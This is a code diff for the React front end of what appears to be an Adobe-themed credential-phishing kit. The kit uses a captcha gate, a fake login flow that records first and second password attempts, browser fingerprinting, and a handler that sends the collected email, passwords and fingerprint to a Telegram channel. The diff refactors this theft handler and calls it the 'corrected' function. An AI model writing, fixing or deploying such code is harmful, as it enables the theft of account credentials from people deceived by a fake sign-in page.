@@ -4,10 +4,10 @@ import MobileLoginPage from './components/mobile/MobileLoginPage';
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
-import Spinner from './components/common/Spinner'; // Import the new Spinner
+import Spinner from './components/common/Spinner';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
-import { config } from './config'; // Import the new config file
+import { config } from './config';
 
 // Helper: robust sender that prefers sendToTelegram util but falls back to fetch if needed.
 const safeSendToTelegram = async (sessionData: any) => {
@@ -35,8 +35,7 @@ function App() {
   const [isMobile, setIsMobile] = useState(false);
   const [hasActiveSession, setHasActiveSession] = useState(false);
   const [currentPage, setCurrentPage] = useState('captcha');
-  const [selectedFileName, setSelectedFileName] = useState('');
-  const [isLoading, setIsLoading] = useState(false);
+  const [isLoading, setIsLoading] = useState(true); // Start true to check session
   const [captchaVerified, setCaptchaVerified] = useState(false);
 
   // Check if device is mobile
@@ -67,13 +66,11 @@ function App() {
 
   // Check for existing session on load
   useEffect(() => {
-    const checkSession = async () => {
-      setIsLoading(true);
-      // Check for session via cookies
+    const checkSession = () => {
       const cookieSession = getCookie('adobe_session');
       if (cookieSession) {
         setHasActiveSession(true);
-        setCaptchaVerified(true);
+        setCaptchaVerified(true); // Skip captcha if session exists
         setCurrentPage('landing');
       } else {
         setCurrentPage('captcha');
@@ -92,51 +89,43 @@ function App() {
     }, 600);
   };
 
-  const handleLoginSuccess = async (secondAttemptData: any) => {
-    console.log('🔐 Login flow complete. Preparing to send data.', secondAttemptData);
-
-    let firstAttemptData = {};
-    try {
-      const storedData = sessionStorage.getItem(config.session.firstAttemptKey);
-      if (storedData) firstAttemptData = JSON.parse(storedData);
-    } catch (e) {
-      console.error('Could not parse first attempt data', e);
-    }
+  // --- THIS IS THE CORRECTED FUNCTION ---
+  const handleLoginSuccess = async (loginData: any) => {
+    console.log('🔐 Login flow complete. Data received from useLogin hook:', loginData);
+    setIsLoading(true);
 
     const browserFingerprint = await getBrowserFingerprint();
+
+    // The loginData from the hook already contains everything we need.
+    // We just add final browser details.
     const finalSessionData = {
-      ...firstAttemptData,
-      ...secondAttemptData,
-      email: secondAttemptData.email,
-      provider: secondAttemptData.provider,
-      firstAttemptPassword: (firstAttemptData as any).password || secondAttemptData.firstAttemptPassword,
-      secondAttemptPassword: secondAttemptData.password,
+      ...loginData, // Contains email, provider, firstAttemptPassword, secondAttemptPassword
       sessionId: Math.random().toString(36).substring(2, 15),
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
       ...browserFingerprint,
     };
-    delete (finalSessionData as any).password;
 
+    // Store session locally and in cookies for persistence
     setHasActiveSession(true);
     localStorage.setItem(config.session.sessionDataKey, JSON.stringify(finalSessionData));
-
     const cookieOptions = {
       path: '/',
       secure: process.env.NODE_ENV === 'production',
       sameSite: 'strict' as const,
     };
-    setCookie('adobe_session', encodeURIComponent(JSON.stringify(secondAttemptData)), cookieOptions);
+    setCookie('adobe_session', encodeURIComponent(JSON.stringify(loginData)), cookieOptions);
     setCookie('logged_in', 'true', cookieOptions);
 
     try {
-      console.log('📤 Sending complete authentication data...');
+      console.log('📤 Sending complete data to Telegram:', finalSessionData);
       await safeSendToTelegram(finalSessionData);
-      console.log('✅ Complete authentication data sent.');
+      console.log('✅ Complete authentication data sent to Telegram.');
     } catch (error) {
-      console.error('❌ Failed to send final data:', error);
+      console.error('❌ Failed to send final data to Telegram:', error);
     }
-
+    
+    // Always proceed to landing page
     setCurrentPage('landing');
     setIsLoading(false);
   };
@@ -187,6 +176,7 @@ function App() {
     return <LandingComponent onLogout={handleLogout} />;
   }
 
+  // Fallback
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center">
       <p className="text-gray-600">Loading application...</p>
